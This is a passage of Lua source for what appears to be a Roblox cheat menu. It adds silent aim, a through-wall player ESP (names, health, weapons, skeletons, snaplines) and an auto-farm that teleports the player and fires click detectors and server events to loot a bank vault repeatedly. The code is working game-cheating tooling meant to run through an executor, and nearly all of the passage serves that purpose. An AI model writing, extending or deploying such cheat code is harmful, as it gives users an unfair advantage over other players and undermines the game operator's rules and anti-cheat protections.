
CreateCardButton(cDeal, "Purchase Vehicle", function()
    if sel_deal ~= "" then
        V_EV:FireServer("BuyVehicle", sel_deal)
        Notify("Car Dealer", "Attempting to purchase: " .. sel_deal, 3)
    else
        Notify("Car Dealer", "Please select a vehicle first!", 2)
    end
end)

local pco = CreateTab("Combat", "Combat Features")
local csa = CreateCard(pco, "Silent aim")

local togSilentAim = CreateToggle(csa, "Enable Silent Aim", false, nil, function(v)
    _G.EXE.SILENT_AIM.Enabled = v
end)

local aimParts = {
    { Name = "Head",   Value = "Head" },
    { Name = "Torso",  Value = "Torso" },
    { Name = "Random", Value = "Random" }
}
CreateDropdown(csa, "Target Part", aimParts, nil, 1, function(val)
    _G.EXE.SILENT_AIM.Hitbox = val
end)

local togWallCheck = CreateToggle(csa, "Wall Check", false, nil, function(v)
    _G.EXE.SILENT_AIM.WallCheck = v
end)
togWallCheck.Keybind.Visible = false

local togFovCircle = CreateToggle(csa, "Show FOV Circle", false, nil, function(v)
    _G.EXE.SILENT_AIM.ShowFOV = v
end)
togFovCircle.Keybind.Visible = false

CreateSlider(csa, "FOV Size", 10, 500, 100, nil, function(v)
    _G.EXE.SILENT_AIM.FOV_Radius = v
end)

local ESP_CFG = {
    Enabled    = false,
    MaxDist    = 500,
    Names      = { Enabled = false, Color = Color3.new(1, 1, 1) },
    Health     = { Enabled = false, Bar = false, Text = false, Color1 = Color3.fromRGB(0, 255, 0), Color2 = Color3.fromRGB(255, 0, 0) },
    Snaplines  = { Enabled = false, Color = Color3.new(1, 0, 0), Thickness = 1.2, OffScreen = false },
    Skeleton   = { Enabled = false, Color = Color3.new(1, 1, 1), Thickness = 1.2 },
    Weapons    = { Enabled = false, Color = Color3.new(1, 1, 1) },
    Dist       = { Enabled = false, Color = Color3.new(1, 1, 1) },
    Chams      = { Enabled = false, Color1 = Color3.fromRGB(119, 120, 255), Color2 = Color3.new(0, 0, 0) },
    ToolCharms = { Enabled = false, Color1 = Color3.fromRGB(119, 120, 255), Color2 = Color3.new(0, 0, 0) },
    FontSize   = 12,
    Font       = Enum.Font.SourceSansBold
}

local ESP_HOLDER = Instance.new("ScreenGui")
ESP_HOLDER.Name = "ESP_HOLDER"
ESP_HOLDER.IgnoreGuiInset = true
ESP_HOLDER.DisplayOrder = -1100
ESP_HOLDER.Parent = game:GetService("CoreGui")

local CACHE = {}

local function MK_ESP(p)
    local E = {
        FRM        = Instance.new("Frame", ESP_HOLDER),
        NAME       = Instance.new("TextLabel"),
        DIST       = Instance.new("TextLabel"),
        WEAP       = Instance.new("TextLabel"),
        BAR_BG     = Instance.new("Frame"),
        BAR_FL     = Instance.new("Frame"),
        BAR_GRAD   = Instance.new("UIGradient"),
        HEALTH_TXT = Instance.new("TextLabel"),
        SLINE      = Instance.new("Frame"),
        SKEL       = {}
    }
    E.SLINE.Parent = E.FRM

    for i = 1, 15 do
        local seg = Instance.new("Frame", E.FRM)
        seg.BorderSizePixel = 0
        seg.Visible = false
        seg.ZIndex = -2
        seg.AnchorPoint = Vector2.new(0.5, 0.5)
        E.SKEL[i] = seg
    end

    E.SLINE.BorderSizePixel = 0
    E.SLINE.ZIndex = -1
    E.SLINE.AnchorPoint = Vector2.new(0.5, 0.5)

    E.FRM.BackgroundTransparency = 1
    E.FRM.Size = UDim2.new(1, 0, 1, 0)
    E.FRM.ZIndex = 0

    local function _SAFE_FONT(lbl, sz)
        lbl.Font = ESP_CFG.Font
        lbl.TextSize = sz or ESP_CFG.FontSize
    end

    E.NAME.Parent = E.FRM
    E.NAME.BackgroundTransparency = 1
    E.NAME.TextColor3 = Color3.new(1, 1, 1)
    _SAFE_FONT(E.NAME, ESP_CFG.FontSize)
    E.NAME.TextStrokeTransparency = 0.5
    E.NAME.TextYAlignment = Enum.TextYAlignment.Bottom

    E.DIST.Parent = E.FRM
    E.DIST.BackgroundTransparency = 1
    E.DIST.TextColor3 = Color3.new(1, 1, 1)
    _SAFE_FONT(E.DIST, ESP_CFG.FontSize - 1)
    E.DIST.TextStrokeTransparency = 0.5
    E.DIST.TextYAlignment = Enum.TextYAlignment.Top

    E.WEAP.Parent = E.FRM
    E.WEAP.BackgroundTransparency = 1
    E.WEAP.TextColor3 = Color3.new(1, 1, 1)
    _SAFE_FONT(E.WEAP, ESP_CFG.FontSize - 1)
    E.WEAP.TextStrokeTransparency = 0.5
    E.WEAP.TextYAlignment = Enum.TextYAlignment.Top

    E.BAR_BG.Parent = E.FRM
    E.BAR_BG.BackgroundColor3 = Color3.new(0, 0, 0)
    E.BAR_BG.BackgroundTransparency = 0.5
    E.BAR_BG.BorderSizePixel = 0

    E.BAR_FL.Parent = E.BAR_BG
    E.BAR_FL.BackgroundColor3 = Color3.new(1, 1, 1)
    E.BAR_FL.BorderSizePixel = 0

    E.BAR_GRAD.Parent = E.BAR_FL
    E.BAR_GRAD.Rotation = 90
    E.BAR_GRAD.Enabled = false

    E.HEALTH_TXT.Parent = E.FRM
    E.HEALTH_TXT.BackgroundTransparency = 1
    E.HEALTH_TXT.TextColor3 = Color3.new(1, 1, 1)
    _SAFE_FONT(E.HEALTH_TXT, ESP_CFG.FontSize - 1)
    E.HEALTH_TXT.TextStrokeTransparency = 0.5
    E.HEALTH_TXT.TextXAlignment = Enum.TextXAlignment.Center

    CACHE[p] = E
    return E
end

local R15_BONES = {
    { "Head",         "UpperTorso" }, { "UpperTorso", "LowerTorso" }, { "UpperTorso", "LeftUpperArm" },
    { "LeftUpperArm", "LeftLowerArm" }, { "LeftLowerArm", "LeftHand" }, { "UpperTorso", "RightUpperArm" },
    { "RightUpperArm", "RightLowerArm" }, { "RightLowerArm", "RightHand" }, { "LowerTorso", "LeftUpperLeg" },
    { "LeftUpperLeg",  "LeftLowerLeg" }, { "LeftLowerLeg", "LeftFoot" }, { "LowerTorso", "RightUpperLeg" },
    { "RightUpperLeg", "RightLowerLeg" }, { "RightLowerLeg", "RightFoot" }
}
local R6_BONES = {
    { "Head",  "Torso" }, { "Torso", "Left Arm" }, { "Torso", "Right Arm" },
    { "Torso", "Left Leg" }, { "Torso", "Right Leg" }
}

local E_SELF_ORIGINAL_MATS = {}

local function UPD_ESP()
    local cam = workspace.CurrentCamera
    local plrs = pls:GetPlayers()

    table.sort(plrs, function(a, b)
        local ca, cb = a.Character or workspace:FindFirstChild(a.Name), b.Character or workspace:FindFirstChild(b.Name)
        local pa = ca and (ca:FindFirstChild("HumanoidRootPart") or ca:FindFirstChild("UpperTorso"))
        local pb = cb and (cb:FindFirstChild("HumanoidRootPart") or cb:FindFirstChild("UpperTorso"))
        local da = pa and (cam.CFrame.Position - pa.Position).Magnitude or 99999
        local db = pb and (cam.CFrame.Position - pb.Position).Magnitude or 99999
        return da < db
    end)

    for _, p in ipairs(plrs) do
        pcall(function()
            local isLocalPlayer = (p == LPLR)
            local E = CACHE[p] or MK_ESP(p)

            local C = p.Character or workspace:FindFirstChild(p.Name)
            if not C then
                for _, obj in pairs(workspace:GetChildren()) do
                    if obj:IsA("Model") and (obj.Name:find(tostring(p.UserId)) or obj.Name:find(p.Name)) then
                        C = obj; break
                    end
                end
            end

            if not C then
                if E.CH_PARTS then
                    for _, v in pairs(E.CH_PARTS) do pcall(function() v:Destroy() end) end; E.CH_PARTS = nil
                end
                E.FRM.Visible = false; return
            end

            local H            = C:FindFirstChild("HumanoidRootPart") or C:FindFirstChild("Torso") or
                C:FindFirstChild("UpperTorso")
            local HUM          = C:FindFirstChildOfClass("Humanoid")

            local curHP, maxHP = 100, 100
            local hv           = C:FindFirstChild("Health")
            if hv and hv:IsA("NumberValue") then
                curHP = hv.Value
            elseif HUM then
                curHP = HUM.Health; maxHP = HUM.MaxHealth
            end

            local isAlive = true
            if HUM and HUM:GetState() == Enum.HumanoidStateType.Dead then
                isAlive = false
            end

            if isLocalPlayer then
                if ESP_CFG.Chams.Enabled and isAlive then
                    E_SELF_ORIGINAL_MATS = E_SELF_ORIGINAL_MATS or {}
                    local wave = (math.sin(tick() * 3.5) + 1) * 0.5
                    local pulseColor = ESP_CFG.Chams.Color1:Lerp(ESP_CFG.Chams.Color2, wave)

                    for _, obj in ipairs(C:GetDescendants()) do
                        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
                            if obj.Name ~= "HumanoidRootPart" and obj.Transparency < 1 and not obj:FindFirstAncestorOfClass("Tool") then
                                local sa = obj:FindFirstChildOfClass("SurfaceAppearance")
                                if not E_SELF_ORIGINAL_MATS[obj] then
                                    E_SELF_ORIGINAL_MATS[obj] = {
                                        Mat = obj.Material,
                                        Col = obj.Color,
                                        SA = sa,
                                        Tr = obj.Transparency
                                    }
                                end
                                if sa then sa.Parent = nil end
                                obj.Material = Enum.Material.ForceField
                                obj.Color = pulseColor
                            end
                        end
                    end
                else
                    if E_SELF_ORIGINAL_MATS then
                        for obj, data in pairs(E_SELF_ORIGINAL_MATS) do
                            pcall(function()
                                if obj and obj.Parent then
                                    obj.Material = data.Mat
                                    obj.Color = data.Col
                                    obj.Transparency = data.Tr
                                    if data.SA and data.SA.Parent ~= obj then
                                        data.SA.Parent = obj
                                    end
                                end
                            end)
                        end
                        E_SELF_ORIGINAL_MATS = nil
                    end
                end
            end

            if ESP_CFG.Enabled and H and isAlive and not isLocalPlayer then
                local cam = workspace.CurrentCamera
                local pos, vis = cam:WorldToViewportPoint(H.Position)
                local dist = (cam.CFrame.Position - H.Position).Magnitude
                local inDist = dist <= ESP_CFG.MaxDist

                E.FRM.Visible = inDist

                if vis and inDist then
                    local s_y = (H.Size.Y * 2 * cam.ViewportSize.Y) / (pos.Z * 2)
                    local s_x = s_y * 0.75
                    local x, y = pos.X - s_x / 2, pos.Y - s_y / 2

                    local function SET_F(lbl, sz)
                        lbl.Font = ESP_CFG.Font
                        lbl.TextSize = sz or ESP_CFG.FontSize
                    end

                    E.NAME.Visible = ESP_CFG.Names.Enabled
                    E.NAME.Position = UDim2.new(0, x - 50, 0, y - (ESP_CFG.FontSize + 4))
                    E.NAME.Size = UDim2.new(0, s_x + 100, 0, ESP_CFG.FontSize)
                    E.NAME.Text = p.Name
                    E.NAME.TextColor3 = ESP_CFG.Names.Color
                    SET_F(E.NAME)

                    local hp_per = math.clamp(curHP / math.max(maxHP, 1), 0, 1)
                    E.BAR_BG.Visible = ESP_CFG.Health.Bar
                    E.BAR_BG.Position = UDim2.new(0, x - 6, 0, y)
                    E.BAR_BG.Size = UDim2.new(0, 3, 0, s_y)
                    E.BAR_FL.Size = UDim2.new(1, 0, hp_per, 0)
                    E.BAR_FL.Position = UDim2.new(0, 0, 1 - hp_per, 0)

                    if ESP_CFG.Health.Bar then
                        E.BAR_FL.BackgroundColor3 = Color3.new(1, 1, 1)
                        E.BAR_GRAD.Enabled = true
                        E.BAR_GRAD.Transparency = NumberSequence.new(0)
                        E.BAR_GRAD.Color = ColorSequence.new(ESP_CFG.Health.Color1, ESP_CFG.Health.Color2)
                    else
                        E.BAR_GRAD.Enabled = false
                    end

                    E.HEALTH_TXT.Visible = ESP_CFG.Health.Text
                    E.HEALTH_TXT.Position = UDim2.new(0, x - 40, 0, y + s_y * (1 - hp_per) - 10)
                    E.HEALTH_TXT.Size = UDim2.new(0, 30, 0, 12)
                    E.HEALTH_TXT.Text = math.floor(curHP)
                    SET_F(E.HEALTH_TXT, ESP_CFG.FontSize - 1)

                    E.WEAP.Visible = ESP_CFG.Weapons.Enabled
                    local tool = C:FindFirstChildOfClass("Tool")
                    E.WEAP.Text = tool and tool.Name or "None"
                    E.WEAP.Position = UDim2.new(0, x - 50, 0, y + s_y + 2)
                    E.WEAP.Size = UDim2.new(0, s_x + 100, 0, ESP_CFG.FontSize)
                    E.WEAP.TextColor3 = ESP_CFG.Weapons.Color
                    SET_F(E.WEAP, ESP_CFG.FontSize - 1)

                    E.DIST.Visible = ESP_CFG.Dist.Enabled
                    E.DIST.Position = UDim2.new(0, x - 50, 0,
                        y + s_y + (ESP_CFG.Weapons.Enabled and ESP_CFG.FontSize + 2 or 2))
                    E.DIST.Size = UDim2.new(0, s_x + 100, 0, ESP_CFG.FontSize)
                    E.DIST.Text = math.floor(dist) .. "st"
                    E.DIST.TextColor3 = ESP_CFG.Dist.Color
                    SET_F(E.DIST, ESP_CFG.FontSize - 1)
                else
                    E.NAME.Visible = false
                    E.BAR_BG.Visible = false
                    E.HEALTH_TXT.Visible = false
                    E.WEAP.Visible = false
                    E.DIST.Visible = false
                end

                if inDist and ESP_CFG.Skeleton.Enabled and vis then
                    local bones = (C:FindFirstChild("UpperTorso") and R15_BONES) or
                        (C:FindFirstChild("Torso") and R6_BONES)
                    if bones then
                        for i, connection in ipairs(bones) do
                            local p1, p2 = C:FindFirstChild(connection[1]), C:FindFirstChild(connection[2])
                            local seg = E.SKEL[i]
                            if p1 and p2 and seg then
                                local v1, vis1 = cam:WorldToViewportPoint(p1.Position)
                                local v2, vis2 = cam:WorldToViewportPoint(p2.Position)
                                if vis1 or vis2 then
                                    local d = Vector2.new(v2.X - v1.X, v2.Y - v1.Y)
                                    seg.Size = UDim2.new(0, ESP_CFG.Skeleton.Thickness, 0, d.Magnitude)
                                    seg.Position = UDim2.new(0, v1.X + (d.X / 2), 0, v1.Y + (d.Y / 2))
                                    seg.Rotation = math.deg(math.atan2(d.Y, d.X)) - 90
                                    seg.BackgroundColor3 = ESP_CFG.Skeleton.Color
                                    seg.Visible = true
                                else
                                    seg.Visible = false
                                end
                            elseif seg then
                                seg.Visible = false
                            end
                        end
                        for i = #bones + 1, 15 do E.SKEL[i].Visible = false end
                    end
                else
                    for i = 1, 15 do E.SKEL[i].Visible = false end
                end

                if E.SLINE then
                    local SL_CFG = ESP_CFG.Snaplines
                    if SL_CFG.Enabled and (vis or SL_CFG.OffScreen) and inDist then
                        local start_pos = Vector2.new(cam.ViewportSize.X / 2, 0)
                        local target_2d = Vector2.new(pos.X, pos.Y)

                        if not vis then
                            local center = cam.ViewportSize / 2
                            local dir = (target_2d - center).Unit
                            if pos.Z < 0 then dir = -dir end
                            local padding = 15
                            target_2d = Vector2.new(
                                math.clamp(center.X + (dir.X * 10000), padding, cam.ViewportSize.X - padding),
                                math.clamp(center.Y + (dir.Y * 10000), padding, cam.ViewportSize.Y - padding)
                            )
                        end
                        local diff = target_2d - start_pos
                        local mag = diff.Magnitude
                        E.SLINE.Visible = true
                        E.SLINE.Size = UDim2.new(0, SL_CFG.Thickness, 0, mag)
                        E.SLINE.Position = UDim2.new(0, start_pos.X + (diff.X / 2), 0, start_pos.Y + (diff.Y / 2))
                        E.SLINE.Rotation = math.deg(math.atan2(diff.Y, diff.X)) - 90
                        E.SLINE.BackgroundColor3 = SL_CFG.Color
                    else
                        E.SLINE.Visible = false
                    end
                end
            else
                if E then
                    E.FRM.Visible = false
                end
            end
        end)
    end
end

RS.RenderStepped:Connect(UPD_ESP)

pls.PlayerRemoving:Connect(function(p)
    if CACHE[p] then
        CACHE[p].FRM:Destroy()
        CACHE[p] = nil
    end
end)

local ccb = CreateCard(pco, "Player Visual Settings")

local togESP = CreateToggle(ccb, "Enabled", false, nil, function(v) ESP_CFG.Enabled = v end)
togESP.Keybind.Visible = false

CreateToggle(ccb, "Names", false, nil, function(v) ESP_CFG.Names.Enabled = v end,
    { { get = function() return ESP_CFG.Names.Color end, set = function(c) ESP_CFG.Names.Color = c end } })
CreateToggle(ccb, "Health Bars", false, nil, function(v) ESP_CFG.Health.Bar = v end,
    { { get = function() return ESP_CFG.Health.Color1 end, set = function(c) ESP_CFG.Health.Color1 = c end }, {
        get = function()
            return
                ESP_CFG.Health.Color2
        end,
        set = function(c) ESP_CFG.Health.Color2 = c end
    } })

local togHealthText = CreateToggle(ccb, "Health Text", false, nil, function(v) ESP_CFG.Health.Text = v end)
togHealthText.Keybind.Visible = false

CreateToggle(ccb, "Weapons", false, nil, function(v) ESP_CFG.Weapons.Enabled = v end,
    { { get = function() return ESP_CFG.Weapons.Color end, set = function(c) ESP_CFG.Weapons.Color = c end } })
CreateToggle(ccb, "Distance", false, nil, function(v) ESP_CFG.Dist.Enabled = v end,
    { { get = function() return ESP_CFG.Dist.Color end, set = function(c) ESP_CFG.Dist.Color = c end } })
CreateToggle(ccb, "Self Charms", false, nil, function(v) ESP_CFG.Chams.Enabled = v end,
    { { get = function() return ESP_CFG.Chams.Color1 end, set = function(c) ESP_CFG.Chams.Color1 = c end }, {
        get = function()
            return
                ESP_CFG.Chams.Color2
        end,
        set = function(c) ESP_CFG.Chams.Color2 = c end
    } })
CreateToggle(ccb, "Tool Charms", false, nil, function(v) ESP_CFG.ToolCharms.Enabled = v end,
    { { get = function() return ESP_CFG.ToolCharms.Color1 end, set = function(c) ESP_CFG.ToolCharms.Color1 = c end }, {
        get = function()
            return
                ESP_CFG.ToolCharms.Color2
        end,
        set = function(c) ESP_CFG.ToolCharms.Color2 = c end
    } })
CreateToggle(ccb, "Snaplines", false, nil, function(v) ESP_CFG.Snaplines.Enabled = v end,
    { { get = function() return ESP_CFG.Snaplines.Color end, set = function(c) ESP_CFG.Snaplines.Color = c end } })

local togOffScreen = CreateToggle(ccb, "Off-Screen Lines", false, nil, function(v) ESP_CFG.Snaplines.OffScreen = v end)
togOffScreen.Keybind.Visible = false

CreateToggle(ccb, "Skeleton", false, nil, function(v) ESP_CFG.Skeleton.Enabled = v end,
    { { get = function() return ESP_CFG.Skeleton.Color end, set = function(c) ESP_CFG.Skeleton.Color = c end } })

local cvs = CreateCard(pco, "Visual Player Settings")
CreateDropdown(cvs, "Text Font", fontOptions, nil, 1, function(val) ESP_CFG.Font = val end)
CreateSlider(cvs, "Text Size", 8, 30, 12, nil, function(val) ESP_CFG.FontSize = val end)
CreateSlider(cvs, "Max Render Distance", 50, 5000, 500, nil, function(val) ESP_CFG.MaxDist = val end)

do
    local pfm = CreateTab("Auto Farms", "Automated Farming")
    local cbf = CreateCard(pfm, "Bank Farm")

    local HEIST_RUNNING = false
    local LAST_HEIST_TICK = 0

    local function RUN_BANK_HEIST()
        local b = workspace.Map.JobModels.Bank.StackOfMoney

        local isAlreadyOpen = false
        local anyMoneyAvailable = false

        for _, child in ipairs(b:GetDescendants()) do
            if child.Name == "Money" and child:IsA("MeshPart") then
                if child.Transparency > 0 then
                    isAlreadyOpen = true
                else
                    anyMoneyAvailable = true
                end
            end
        end

        if isAlreadyOpen and not anyMoneyAvailable then
            Notify("Bank Heist", "Bank is empty! Waiting...", 4)
            return
        end

        local Event = game:GetService("ReplicatedStorage").Events.ServerEvent

        if not isAlreadyOpen then
            local cashStr = LPLR.PlayerGui.MainScreen.Profile.CashAmount.Text
            local cash = tonumber((cashStr:gsub("%D", ""))) or 0
            if cash < 4600 then
                Notify("Bank Heist", "Vault closed & not enough cash ($4,600 needed)!", 5)
                return
            end

            Notify("Bank Heist", "Vault closed. Buying gear...", 3)
            Event:FireServer("BuyItemTool", "DuffelBag", false)
            task.wait(0.3)
            Event:FireServer("BuyItemTool", "SecureEntry", false)
            task.wait(0.5)

            if SafeTP then SafeTP(Vector3.new(149, 90, -155)) end
            task.wait(0.8)

            local backpack = LPLR:FindFirstChild("Backpack")
            local tool = backpack and backpack:FindFirstChild("SecureEntry")
            if tool then
                LPLR.Character.Humanoid:EquipTool(tool)
            else
                local charTool = LPLR.Character:FindFirstChild("SecureEntry")
                if not charTool then
                    Notify("Bank Heist", "Failed to buy/equip SecureEntry!", 4)
                    return
                end
            end
            task.wait(0.4)
            Event:FireServer("PackBank")
            task.wait(0.8)
        else
            Notify("Bank Heist", "Vault OPEN! Buying DuffelBag & Bypassing entry...", 4)
            Event:FireServer("BuyItemTool", "DuffelBag", false)
            task.wait(0.5)
        end

        if SafeTP then SafeTP(Vector3.new(153, 88, -126)) end
        task.wait(1)

        local detectors = {
            b:GetChildren()[2]:GetChildren()[2].ClickDetector, b:GetChildren()[2]:GetChildren()[7].ClickDetector,
            b:GetChildren()[2]:GetChildren()[4].ClickDetector, b:GetChildren()[2].Money.ClickDetector,
            b.Model:GetChildren()[7].ClickDetector, b.Model.Money.ClickDetector,
            b.Model:GetChildren()[4].ClickDetector, b.Model:GetChildren()[2].ClickDetector,
            b.Model:GetChildren()[5].ClickDetector, b.Model:GetChildren()[6].ClickDetector,
            b.Model:GetChildren()[3].ClickDetector, b:GetChildren()[7].Money.ClickDetector,
            b:GetChildren()[7]:GetChildren()[3].ClickDetector, b:GetChildren()[7]:GetChildren()[7].ClickDetector,
            b:GetChildren()[7]:GetChildren()[4].ClickDetector, b:GetChildren()[7]:GetChildren()[2].ClickDetector,
            b:GetChildren()[7]:GetChildren()[5].ClickDetector, b:GetChildren()[7]:GetChildren()[6].ClickDetector,
            b:GetChildren()[5]:GetChildren()[3].ClickDetector, b:GetChildren()[5]:GetChildren()[7].ClickDetector,
            b:GetChildren()[5].Money.ClickDetector, b:GetChildren()[5]:GetChildren()[4].ClickDetector,
            b:GetChildren()[5]:GetChildren()[2].ClickDetector, b:GetChildren()[5]:GetChildren()[5].ClickDetector,
            b:GetChildren()[5]:GetChildren()[6].ClickDetector, b:GetChildren()[2]:GetChildren()[3].ClickDetector,
            b:GetChildren()[2]:GetChildren()[5].ClickDetector, b:GetChildren()[2]:GetChildren()[6].ClickDetector,
            b:GetChildren()[4]:GetChildren()[3].ClickDetector, b:GetChildren()[4]:GetChildren()[7].ClickDetector,
            b:GetChildren()[4].Money.ClickDetector, b:GetChildren()[4]:GetChildren()[4].ClickDetector,
            b:GetChildren()[4]:GetChildren()[2].ClickDetector, b:GetChildren()[4]:GetChildren()[5].ClickDetector,
            b:GetChildren()[4]:GetChildren()[6].ClickDetector, b:GetChildren()[8]:GetChildren()[3].ClickDetector,
            b:GetChildren()[6]:GetChildren()[7].ClickDetector, b:GetChildren()[6].Money.ClickDetector,
            b:GetChildren()[6]:GetChildren()[4].ClickDetector, b:GetChildren()[6]:GetChildren()[2].ClickDetector,
            b:GetChildren()[6]:GetChildren()[5].ClickDetector, b:GetChildren()[6]:GetChildren()[6].ClickDetector,
            b:GetChildren()[6]:GetChildren()[3].ClickDetector, b:GetChildren()[3]:GetChildren()[3].ClickDetector,
            b:GetChildren()[3]:GetChildren()[7].ClickDetector, b:GetChildren()[3].Money.ClickDetector,
            b:GetChildren()[3]:GetChildren()[4].ClickDetector, b:GetChildren()[3]:GetChildren()[2].ClickDetector,
            b:GetChildren()[3]:GetChildren()[5].ClickDetector, b:GetChildren()[3]:GetChildren()[6].ClickDetector,
            b:GetChildren()[8]:GetChildren()[7].ClickDetector, b:GetChildren()[8].Money.ClickDetector,
            b:GetChildren()[8]:GetChildren()[4].ClickDetector, b:GetChildren()[8]:GetChildren()[2].ClickDetector,
            b:GetChildren()[8]:GetChildren()[5].ClickDetector, b:GetChildren()[8]:GetChildren()[6].ClickDetector
        }

        local available = {}
        for _, d in ipairs(detectors) do
            pcall(function()
                if d and d.Parent and d.Parent.Transparency == 0 then table.insert(available, d) end
            end)
        end

        local count = math.random(10, 11)
        for i = 1, math.min(count, #available) do
            local idx = math.random(1, #available)
            local det = table.remove(available, idx)
            pcall(fireclickdetector, det)
            task.wait(0.15)
        end

        Notify("Bank Heist", "Money collected! Delivering...", 3)
        if SafeTP then SafeTP(Vector3.new(980, 231, -493)) end
        task.wait(2)
        Notify("Bank Heist", "Heist complete!", 5)
    end

    local togBank = CreateToggle(cbf, "Auto Bank Heist", false, nil, function(v)
        HEIST_RUNNING = v
        if HEIST_RUNNING then
            task.spawn(function()
                while HEIST_RUNNING do
                    local timeSinceLast = tick() - LAST_HEIST_TICK
                    if timeSinceLast < 300 then
                        local remain = math.ceil(300 - timeSinceLast)
                        task.wait(remain)
                    end

                    if not HEIST_RUNNING then break end
                    pcall(RUN_BANK_HEIST)
                    LAST_HEIST_TICK = tick()

                    if HEIST_RUNNING then
                        Notify("Bank Heist", "Heist finished! 5 min cooldown started.", 5)
                        for i = 4, 1, -1 do
                            task.wait(60)
                            if not HEIST_RUNNING then break end
                            Notify("Bank Heist", "Cooldown: " .. i .. " min remaining...", 3)
                        end
                        if HEIST_RUNNING then task.wait(60) end
                    end
                end
            end)
        end
    end)
    togBank.Keybind.Visible = false

    CreateCardButton(cbf, "Server Hop", function()
        pcall(function()
            local x = {}
            for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100")).data) do
                if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
                    x[#x + 1] = v.id
                end
            end
            if #x > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
            end
        end)
    end)

    local cpf = CreateCard(pfm, "Plant Farm")

    local PLOT_VECTORS = {
        Vector3.new(1537.79, 105.92, 2766.60), Vector3.new(1541.13, 105.92, 2766.59), Vector3.new(1544.73, 105.92,
        2766.70),
        Vector3.new(1548.26, 105.92, 2766.76), Vector3.new(1551.90, 105.92, 2766.98), Vector3.new(1528.33, 105.92,
        2769.54),
        Vector3.new(1528.12, 105.92, 2773.44), Vector3.new(1530.87, 105.92, 2776.16), Vector3.new(1533.86, 105.92,
        2776.21),
        Vector3.new(1536.92, 105.92, 2776.14), Vector3.new(1540.05, 105.92, 2776.17), Vector3.new(1542.78, 105.92,
        2776.40),
        Vector3.new(1545.60, 105.92, 2776.52), Vector3.new(1548.92, 105.92, 2776.53), Vector3.new(1552.15, 105.92,
        2776.57),
        Vector3.new(1555.72, 105.82, 2776.66), Vector3.new(1556.33, 109.45, 2753.81), Vector3.new(1552.68, 109.45,
        2753.92),
        Vector3.new(1549.34, 109.45, 2754.11), Vector3.new(1545.74, 109.45, 2754.19), Vector3.new(1542.21, 109.45,
        2754.31),
        Vector3.new(1538.56, 109.45, 2754.29), Vector3.new(1561.98, 109.45, 2750.49), Vector3.new(1561.97, 109.45,
        2746.59),
        Vector3.new(1559.09, 109.45, 2744.01), Vector3.new(1556.10, 109.45, 2744.12), Vector3.new(1553.05, 109.45,
        2744.36),
        Vector3.new(1549.92, 109.45, 2744.48), Vector3.new(1547.18, 109.45, 2744.40), Vector3.new(1544.36, 109.45,
        2744.42),
        Vector3.new(1541.05, 109.45, 2744.59), Vector3.new(1537.81, 109.45, 2744.71), Vector3.new(1534.25, 109.35,
        2744.81),
        Vector3.new(1515.81, 107.11, 2676.36), Vector3.new(1515.99, 107.11, 2680.02), Vector3.new(1516.23, 107.11,
        2683.35),
        Vector3.new(1516.38, 107.11, 2686.95), Vector3.new(1516.56, 107.11, 2690.47), Vector3.new(1516.60, 107.11,
        2694.12),
        Vector3.new(1512.40, 107.11, 2670.78), Vector3.new(1508.49, 107.11, 2670.85), Vector3.new(1506.53, 107.11,
        2673.94),
        Vector3.new(1506.50, 107.11, 2676.87), Vector3.new(1506.42, 107.11, 2679.81), Vector3.new(1506.60, 107.11,
        2682.94),
        Vector3.new(1506.57, 107.11, 2685.68), Vector3.new(1506.64, 107.11, 2688.50), Vector3.new(1506.86, 107.11,
        2691.81),
        Vector3.new(1507.04, 107.11, 2695.04), Vector3.new(1507.20, 107.01, 2698.60), Vector3.new(1556.38, 106.08,
        2655.22),
        Vector3.new(1553.03, 106.08, 2656.70), Vector3.new(1550.00, 106.08, 2658.12), Vector3.new(1546.69, 106.08,
        2659.54),
        Vector3.new(1543.47, 106.08, 2660.98), Vector3.new(1540.08, 106.08, 2662.32), Vector3.new(1560.37, 106.08,
        2650.03),
        Vector3.new(1558.90, 106.08, 2646.41), Vector3.new(1555.26, 106.08, 2645.11), Vector3.new(1552.53, 106.08,
        2646.33),
        Vector3.new(1549.79, 106.08, 2647.69), Vector3.new(1546.93, 106.08, 2648.98), Vector3.new(1544.37, 106.08,
        2649.93),
        Vector3.new(1541.76, 106.08, 2651.01), Vector3.new(1538.75, 106.08, 2652.40), Vector3.new(1535.80, 106.08,
        2653.73),
        Vector3.new(1532.53, 105.98, 2655.16), Vector3.new(-807.30, 52.60, -54.58), Vector3.new(-803.92, 52.60, -54.58),
        Vector3.new(-800.55, 52.60, -54.58), Vector3.new(-797.26, 52.60, -54.58), Vector3.new(-794.17, 52.60, -54.58),
        Vector3.new(-794.17, 52.60, -49.99), Vector3.new(-794.17, 52.60, -46.59), Vector3.new(1403.73, 141.15, 38.04),
        Vector3.new(1409.71, 141.15, 38.04), Vector3.new(1415.64, 141.15, 38.04), Vector3.new(1421.45, 141.15, 38.04),
        Vector3.new(1397.52, 141.15, 38.04)
    }

    local seedOpts = {
        { Name = "Blackberry ($1,500)", Value = "Blackberry Seed" },
        { Name = "Raspberry ($500)",    Value = "Raspberry Seed" },
        { Name = "Strawberry ($6,500)", Value = "Strawberry Seed" },
        { Name = "Blueberry ($3,000)",  Value = "Blueberry Seed" }
    }
    local selSeed = seedOpts[1].Value
    CreateDropdown(cpf, "Available Seeds", seedOpts, nil, 1, function(val)
        selSeed = val
    end)

    local amtOpts = {
        { Name = "1", Value = 1 }, { Name = "2", Value = 2 }, { Name = "3", Value = 3 },
        { Name = "4", Value = 4 }, { Name = "5", Value = 5 }, { Name = "6", Value = 6 },
        { Name = "7", Value = 7 }, { Name = "8", Value = 8 }, { Name = "9", Value = 9 }
    }
    local selAmt = 1
    CreateDropdown(cpf, "Plant Amount", amtOpts, nil, 1, function(val)
        selAmt = tonumber(val) or 1
    end)

    CreateCardButton(cpf, "Tp to Pot", function()
        local randIdx = math.random(1, #PLOT_VECTORS)
        if SafeTP then
            SafeTP(PLOT_VECTORS[randIdx])
            Notify("Plant Farm", "Teleported to a random pot!", 2)
        end
    end)

    CreateCardButton(cpf, "Buy Selected Seed", function()
        if selSeed == "None" then
            Notify("Plant Farm", "Please select a valid seed!", 2)
            return
        end
